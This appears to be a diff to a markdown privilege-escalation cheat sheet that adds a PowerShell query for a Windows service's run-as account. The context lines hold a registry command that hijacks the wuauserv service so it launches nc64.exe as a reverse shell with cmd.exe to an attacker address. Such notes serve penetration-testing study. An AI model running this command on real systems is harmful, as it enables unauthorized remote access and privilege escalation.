@@ -413,6 +413,10 @@ Mannually change registry service path
 ```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "c:\inetpub\wwwroot\nc64.exe 10.10.14.xx 8887 -e cmd.exe " /f
 ```
+Powershell to list windows registry service runner
+```
+(gp -path hklm:\system\currentcontrolset\services\DoSvc).ObjectName
+```
 ### Linux
 ##### Directory Permissions
 >A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example).
